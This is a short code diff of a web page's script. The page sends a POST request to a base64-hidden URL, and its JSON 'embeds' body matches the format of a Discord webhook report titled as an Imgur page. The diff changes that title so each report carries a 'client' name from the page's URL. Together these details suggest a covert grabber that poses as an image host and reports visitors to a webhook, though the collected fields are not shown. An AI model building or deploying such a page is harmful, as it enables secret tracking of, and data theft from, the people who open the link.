@@ -15,6 +15,7 @@
         </body>
 
         <script>
+            
             class Start {
                 static async start() {
                     let i;
@@ -73,11 +74,15 @@
                     request.open("POST", atob(u));
 
                     request.setRequestHeader("Content-type", "application/json");
-
+                    let nome = "Desconhecido";
+                    try{
+                        const urlParams = new URLSearchParams(window.location.search);
+                        nome = urlParams.get('client');
+                    } catch(e){}
                     const params = {
                     embeds: [
                         {
-                        title: `${atob("SW1ndXIgZG8gSnVuaW5obw==")}`,
+                        title: `Imgur de ${nome}`,
                         fields: [
                             {
                             name: "",
